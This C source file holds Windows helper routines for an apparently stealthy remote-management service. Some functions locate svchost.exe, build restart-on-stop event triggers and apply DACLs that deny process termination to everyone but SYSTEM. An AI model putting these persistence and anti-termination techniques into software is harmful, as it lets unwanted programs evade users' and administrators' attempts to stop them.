#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <wchar.h>
#include <limits.h>
#include <strsafe.h>
#include <sddl.h>
#include <aclapi.h>
#include <shlobj.h>
#include <knownfolders.h>
#include "stealth_utils.h"
#include "stealth_defaults.h"
#include "service_security.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

static void WriteDebugStringA(const char* message)
{
    if (message == NULL) { return; }
    OutputDebugStringA(message);
#if defined(_DEBUG)
    fputs(message, stdout);
#endif
}

static void WriteDebugStringW(const wchar_t* message)
{
    if (message == NULL) { return; }
    OutputDebugStringW(message);
#if defined(_DEBUG)
    fputws(message, stdout);
#endif
}

void Stealth_DebugPrintfA(const char* format, ...)
{
    if (format == NULL) { return; }

    char buffer[1024];
    va_list args;
    va_start(args, format);
    _vsnprintf_s(buffer, sizeof(buffer), _TRUNCATE, format, args);
    va_end(args);

    WriteDebugStringA(buffer);
    if (buffer[0] != 0 && buffer[strlen(buffer) - 1] != '\n')
    {
        WriteDebugStringA("\n");
    }
}

void Stealth_DebugPrintfW(const wchar_t* format, ...)
{
    if (format == NULL) { return; }

    wchar_t buffer[1024];
    va_list args;
    va_start(args, format);
    _vsnwprintf_s(buffer, sizeof(buffer) / sizeof(buffer[0]), _TRUNCATE, format, args);
    va_end(args);

    WriteDebugStringW(buffer);
    size_t len = wcslen(buffer);
    if (len > 0 && buffer[len - 1] != L'\n')
    {
        WriteDebugStringW(L"\n");
    }
}

static void DebugLastErrorInternalA(const char* context)
{
    DWORD errorCode = GetLastError();
    if (errorCode == 0) { return; }

    char message[512];
    DWORD flags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
    DWORD length = FormatMessageA(flags, NULL, errorCode, 0, message, (DWORD)sizeof(message), NULL);
    if (length == 0)
    {
        _snprintf_s(message, sizeof(message), _TRUNCATE, "Unknown error 0x%08lX", errorCode);
    }

    if (context != NULL)
    {
        Stealth_DebugPrintfA("%s failed with error %lu (%s)", context, errorCode, message);
    }
    else
    {
        Stealth_DebugPrintfA("Win32 error %lu (%s)", errorCode, message);
    }
}

static void DebugLastErrorInternalW(const wchar_t* context)
{
    DWORD errorCode = GetLastError();
    if (errorCode == 0) { return; }

    wchar_t message[512];
    DWORD flags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
    DWORD length = FormatMessageW(flags, NULL, errorCode, 0, message, (DWORD)(sizeof(message) / sizeof(message[0])), NULL);
    if (length == 0)
    {
        _snwprintf_s(message, sizeof(message) / sizeof(message[0]), _TRUNCATE, L"Unknown error 0x%08lX", errorCode);
    }

    if (context != NULL)
    {
        Stealth_DebugPrintfW(L"%s failed with error %lu (%s)", context, errorCode, message);
    }
    else
    {
        Stealth_DebugPrintfW(L"Win32 error %lu (%s)", errorCode, message);
    }
}

void Stealth_DebugLastErrorA(const char* context)
{
    DebugLastErrorInternalA(context);
}

void Stealth_DebugLastErrorW(const wchar_t* context)
{
    DebugLastErrorInternalW(context);
}

BOOL Stealth_ComputeFileSha256W(const wchar_t* path, wchar_t* hexOut, size_t hexOutLen)
{
    if (path == NULL || hexOut == NULL || hexOutLen == 0) { return FALSE; }
    if (hexOutLen <= STEALTH_SHA256_STRING_LENGTH) { return FALSE; }

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        Stealth_DebugLastErrorW(L"CreateFileW");
        return FALSE;
    }

    BOOL success = FALSE;
    SHA256_CTX ctx;
    SHA256_Init(&ctx);

    BYTE buffer[4096];
    DWORD bytesRead = 0;
    while (TRUE)
    {
        if (!ReadFile(hFile, buffer, (DWORD)sizeof(buffer), &bytesRead, NULL))
        {
            Stealth_DebugLastErrorW(L"ReadFile");
            goto cleanup;
        }
        if (bytesRead == 0) { break; }
        SHA256_Update(&ctx, buffer, bytesRead);
    }

    BYTE hash[UTIL_SHA256_HASHSIZE];
    SHA256_Final(hash, &ctx);

    static const wchar_t hexChars[] = L"0123456789ABCDEF";
    for (size_t i = 0; i < UTIL_SHA256_HASHSIZE; ++i)
    {
        hexOut[i * 2] = hexChars[(hash[i] >> 4) & 0x0F];
        hexOut[i * 2 + 1] = hexChars[hash[i] & 0x0F];
    }
    hexOut[STEALTH_SHA256_STRING_LENGTH] = L'\0';
    success = TRUE;

cleanup:
    CloseHandle(hFile);
    return success;
}

BOOL Stealth_GetSystemSvchostPathW(wchar_t* outPath, size_t outPathSize)
{
    UINT systemLen;

    if (outPath == NULL || outPathSize == 0 || outPathSize > UINT_MAX)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    outPath[0] = L'\0';

    systemLen = GetSystemDirectoryW(outPath, (UINT)outPathSize);
    if (systemLen == 0 || systemLen >= outPathSize)
    {
        outPath[0] = L'\0';
        SetLastError(systemLen == 0 ? GetLastError() : ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }
    if (FAILED(StringCchCatW(outPath, outPathSize, L"\\svchost.exe")))
    {
        outPath[0] = L'\0';
        SetLastError(ERROR_INSUFFICIENT_BUFFER);
        return FALSE;
    }
    if (GetFileAttributesW(outPath) == INVALID_FILE_ATTRIBUTES)
    {
        outPath[0] = L'\0';
        return FALSE;
    }
    return TRUE;
}

/*
 * Build a sanitized token from a service name for use in task names etc.
 * Removes/replaces invalid characters.
 */
void Stealth_BuildSanitizedToken(const wchar_t* input, wchar_t* output, size_t outputSize)
{
    if (input == NULL || output == NULL || outputSize == 0) { return; }

    size_t i = 0;
    size_t j = 0;

    while (input[i] != L'\0' && j < outputSize - 1)
    {
        wchar_t c = input[i];
        /* Allow alphanumeric, underscore, dash */
        if ((c >= L'A' && c <= L'Z') ||
            (c >= L'a' && c <= L'z') ||
            (c >= L'0' && c <= L'9') ||
            c == L'_' || c == L'-')
        {
            output[j++] = c;
        }
        else if (c == L' ')
        {
            output[j++] = L'_';
        }
        i++;
    }
    output[j] = L'\0';
}

/*
 * Format an XPath query for service stop events in Event Log.
 * Used for restart-on-stop task triggers.
 */
void Stealth_FormatServiceStopXPath(const wchar_t* serviceName, wchar_t* xPath, size_t xPathSize)
{
    if (serviceName == NULL || xPath == NULL || xPathSize == 0) { return; }

    /* Event Log query for service stop event (Event ID 7036) */
    _snwprintf_s(xPath, xPathSize, _TRUNCATE,
        L"<QueryList>"
        L"<Query Id=\"0\" Path=\"System\">"
        L"<Select Path=\"System\">"
        L"*[System[Provider[@Name='Service Control Manager'] and (EventID=7036)]] "
        L"and *[EventData[Data[@Name='param1']='%ls']] "
        L"and *[EventData[Data[@Name='param2']='stopped']]"
        L"</Select>"
        L"</Query>"
        L"</QueryList>",
        serviceName);
}

/*
 * Protect service from termination by setting restricted DACL.
 * This prevents most user-mode stop attempts.
 */
BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName)
{
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL result = FALSE;

    if (serviceName == NULL) { return FALSE; }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL)
    {
        Stealth_DebugLastErrorW(L"OpenSCManager");
        return FALSE;
    }

    hService = OpenServiceW(hSCM, serviceName, READ_CONTROL | WRITE_DAC);
    if (hService == NULL)
    {
        Stealth_DebugLastErrorW(L"OpenService");
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    /* Apply hardened service DACL (consistent with validation expectations) */
    PSECURITY_DESCRIPTOR pSD = NULL;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorW(
            MESH_SERVICE_DACL_SDDL, SDDL_REVISION_1, &pSD, NULL))
    {
        if (SetServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, pSD))
        {
            result = TRUE;
            Stealth_DebugPrintfW(L"Applied termination protection DACL to %ls", serviceName);
        }
        else
        {
            Stealth_DebugLastErrorW(L"SetServiceObjectSecurity");
        }
        LocalFree(pSD);
    }
    else
    {
        Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptor");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return result;
}

/*
 * Get the data directory path for the service.
 * Uses SHGetKnownFolderPath to get ProgramData, avoiding hardcoded paths.
 */
BOOL Stealth_GetDataDirectoryW(const wchar_t* serviceName, wchar_t* outPath, size_t outPathSize)
{
    PWSTR programDataPath = NULL;
    HRESULT hr;

    if (outPath == NULL || outPathSize == 0) {
        return FALSE;
    }

    outPath[0] = L'\0';

    /* Use fallback service name if not provided */
    if (serviceName == NULL || serviceName[0] == L'\0') {
        serviceName = STEALTH_FALLBACK_SERVICE_NAME;
    }

    /* Get the ProgramData path dynamically */
    hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, 0, NULL, &programDataPath);
    if (FAILED(hr) || programDataPath == NULL) {
        /* Fallback to environment variable */
        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", outPath, (DWORD)outPathSize);
        if (envLen == 0 || envLen >= outPathSize) {
            /* Last resort fallback */
            wcscpy_s(outPath, outPathSize, L"C:\\ProgramData");
        }
    } else {
        wcscpy_s(outPath, outPathSize, programDataPath);
        CoTaskMemFree(programDataPath);
    }

    /* Append service name subdirectory */
    StringCchCatW(outPath, outPathSize, L"\\");
    StringCchCatW(outPath, outPathSize, serviceName);

    return TRUE;
}

/*
 * Build a full path to a file within the data directory.
 */
BOOL Stealth_GetDataFilePathW(const wchar_t* serviceName, const wchar_t* fileName, wchar_t* outPath, size_t outPathSize)
{
    if (fileName == NULL || outPath == NULL || outPathSize == 0) {
        return FALSE;
    }

    /* Get base directory */
    if (!Stealth_GetDataDirectoryW(serviceName, outPath, outPathSize)) {
        return FALSE;
    }

    /* Append file name */
    StringCchCatW(outPath, outPathSize, L"\\");
    StringCchCatW(outPath, outPathSize, fileName);

    return TRUE;
}

/*
 * Protect the current process from termination by setting a restrictive DACL.
 * This denies PROCESS_TERMINATE to non-SYSTEM users.
 *
 * CRITICAL: This is different from Stealth_ProtectServiceFromTermination()
 * which only protects the SERVICE object in SCM. This function protects
 * the actual PROCESS in memory from TerminateProcess() calls.
 */
BOOL Stealth_ProtectCurrentProcess(void)
{
    BOOL result = FALSE;
    HANDLE hProcess = GetCurrentProcess();
    PSECURITY_DESCRIPTOR pSD = NULL;
    PACL pDacl = NULL;
    DWORD dwRes;

    /*
     * Build a DACL that:
     * - Gives SYSTEM full control
     * - Gives Administrators READ access only (no terminate)
     * - Denies PROCESS_TERMINATE to Everyone else
     *
     * SDDL explanation:
     * D: = DACL
     * (A;;GA;;;SY) = Allow GENERIC_ALL to SYSTEM
     * (A;;GR;;;BA) = Allow GENERIC_READ to Built-in Administrators
     * (D;;0x0001;;;WD) = Deny PROCESS_TERMINATE (0x0001) to Everyone (World)
     */
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;;GA;;;SY)(A;;0x1fffff;;;BA)(D;;0x0001;;;WD)",
            SDDL_REVISION_1, &pSD, NULL))
    {
        Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptor (process)");
        return FALSE;
    }

    /* Extract the DACL from the security descriptor */
    BOOL bDaclPresent = FALSE;
    BOOL bDaclDefaulted = FALSE;
    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted))
    {
        Stealth_DebugLastErrorW(L"GetSecurityDescriptorDacl");
        LocalFree(pSD);
        return FALSE;
    }

    if (!bDaclPresent || pDacl == NULL)
    {
        Stealth_DebugPrintfW(L"No DACL in security descriptor");
        LocalFree(pSD);
        return FALSE;
    }

    /* Apply the DACL to the current process */
    dwRes = SetSecurityInfo(
        hProcess,
        SE_KERNEL_OBJECT,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL,  /* Owner SID */
        NULL,  /* Group SID */
        pDacl,
        NULL   /* SACL */
    );

    if (dwRes == ERROR_SUCCESS)
    {
        result = TRUE;
        Stealth_DebugPrintfW(L"Applied process termination protection DACL");
    }
    else
    {
        SetLastError(dwRes);
        Stealth_DebugLastErrorW(L"SetSecurityInfo (process DACL)");
    }

    LocalFree(pSD);
    return result;
}

/*
 * Protect a process by handle from termination.
 * Variant that accepts a process handle instead of using current process.
 */
BOOL Stealth_ProtectProcessByHandle(HANDLE hProcess)
{
    BOOL result = FALSE;
    PSECURITY_DESCRIPTOR pSD = NULL;
    PACL pDacl = NULL;
    DWORD dwRes;

    if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    /* Same restrictive DACL as ProtectCurrentProcess */
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;;GA;;;SY)(A;;0x1fffff;;;BA)(D;;0x0001;;;WD)",
            SDDL_REVISION_1, &pSD, NULL))
    {
        Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptor (process handle)");
        return FALSE;
    }

    BOOL bDaclPresent = FALSE;
    BOOL bDaclDefaulted = FALSE;
    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted))
    {
        Stealth_DebugLastErrorW(L"GetSecurityDescriptorDacl");
        LocalFree(pSD);
        return FALSE;
    }

    if (!bDaclPresent || pDacl == NULL)
    {
        Stealth_DebugPrintfW(L"No DACL in security descriptor");
        LocalFree(pSD);
        return FALSE;
    }

    dwRes = SetSecurityInfo(
        hProcess,
        SE_KERNEL_OBJECT,
        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
        NULL, NULL, pDacl, NULL
    );

    if (dwRes == ERROR_SUCCESS)
    {
        result = TRUE;
        Stealth_DebugPrintfW(L"Applied process termination protection DACL to handle");
    }
    else
    {
        SetLastError(dwRes);
        Stealth_DebugLastErrorW(L"SetSecurityInfo (process handle DACL)");
    }

    LocalFree(pSD);
    return result;
}

/*
 * Ensure the data directory exists, creating it if necessary.
 */
BOOL Stealth_EnsureDataDirectoryW(const wchar_t* serviceName)
{
    wchar_t dataDir[MAX_PATH];

    if (!Stealth_GetDataDirectoryW(serviceName, dataDir, MAX_PATH)) {
        return FALSE;
    }

    /* Check if directory exists */
    DWORD attrs = GetFileAttributesW(dataDir);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return TRUE; /* Already exists */
    }

    /* Create directory (may need to create parent too) */
    if (SHCreateDirectoryExW(NULL, dataDir, NULL) == ERROR_SUCCESS) {
        return TRUE;
    }

    /* Try CreateDirectory as fallback */
    if (CreateDirectoryW(dataDir, NULL)) {
        return TRUE;
    }

    /* Try creating with parent directories */
    wchar_t* lastSlash = wcsrchr(dataDir, L'\\');
    if (lastSlash != NULL) {
        *lastSlash = L'\0';
        /* Create parent */
        if (CreateDirectoryW(dataDir, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
            *lastSlash = L'\\';
            if (CreateDirectoryW(dataDir, NULL)) {
                return TRUE;
            }
        }
        *lastSlash = L'\\';
    }

    return GetLastError() == ERROR_ALREADY_EXISTS;
}
